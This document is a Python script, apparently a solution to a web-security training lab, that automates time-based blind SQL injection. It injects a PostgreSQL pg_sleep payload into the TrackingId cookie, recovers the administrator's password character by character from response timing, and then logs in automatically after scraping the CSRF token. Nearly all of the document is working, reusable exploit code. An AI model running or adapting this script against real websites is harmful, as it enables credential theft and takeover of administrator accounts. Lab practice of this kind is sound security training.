import requests
import time
from bs4 import BeautifulSoup

def get_tracking_id(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
    except Exception as e:
        print(f"[!] Lỗi khi truy cập: {e}")
        return None

    if 'Set-Cookie' in response.headers:
        cookies_header = response.headers['Set-Cookie']
        cookie_parts = cookies_header.split(';')
        for part in cookie_parts:
            if part.strip().startswith('TrackingId='):
                return part.strip().split('=')[1]
    return None

def extract_password_time_sqli(url, tracking_id, session_cookie=None, max_length=30, delay_threshold=4.5):
    print("[*] Bắt đầu dò password bằng time-based SQLi...")
    charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
    password = ''

    for index in range(1, max_length + 1):
        found = False
        for c in charset:
            payload = f"{tracking_id}' || (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password,{index},1) = '{c}') THEN pg_sleep(5) ELSE '' END FROM users)--"
            cookies = {
                "TrackingId": payload
            }
            if session_cookie:
                cookies["session"] = session_cookie

            print(f"[*] Thử ký tự thứ {index}: '{c}'", end='\r')
            try:
                start_time = time.time()
                requests.get(url, cookies=cookies, timeout=10)
                elapsed = time.time() - start_time
            except requests.exceptions.ReadTimeout:
                elapsed = 10
            except Exception as e:
                print(f"[!] Lỗi: {e}")
                continue

            if elapsed > delay_threshold:
                password += c
                print(f"\n[+] Tìm thấy ký tự thứ {index}: '{c}' => {password}")
                found = True
                break

        if not found:
            print("\n[-] Không tìm thấy thêm ký tự, kết thúc.")
            break
    return password

def login_admin(url, password):
    login_url = f"{url}/login"
    session = requests.Session()
    try:
        response = session.get(login_url)
        response.raise_for_status()
    except Exception as e:
        print(f"[!] Lỗi khi truy cập trang login: {e}")
        return False

    soup = BeautifulSoup(response.text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})

    if not csrf_input:
        print("[-] Không tìm thấy CSRF token.")
        return False

    csrf_token = csrf_input["value"]
    data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": password
    }

    print("[*] Thử đăng nhập với mật khẩu dò được...")
    response = session.post(login_url, data=data)

    if "Log out" in response.text or "Welcome" in response.text or response.url != login_url:
        print("[+] Đăng nhập thành công!")
        return True
    else:
        print("[-] Đăng nhập thất bại.")
        return False

if __name__ == "__main__":
    print("Nhập URL (ví dụ: https://xxxxx.web-security-academy.net/):")
    url = input(">> ").rstrip("/")

    session_cookie = input("Nhập session cookie (Enter nếu không có): ").strip() or None

    tracking_id = get_tracking_id(url)
    if not tracking_id:
        print("[-] Không tìm thấy TrackingId trong Set-Cookie.")
        exit()

    print(f"[+] TrackingId lấy được: {tracking_id}")
    password = extract_password_time_sqli(url, tracking_id, session_cookie)

    if password:
        print(f"[+] Mật khẩu thu được: {password}")
        login_admin(url, password)
    else:
        print("[-] Không dò được mật khẩu.")
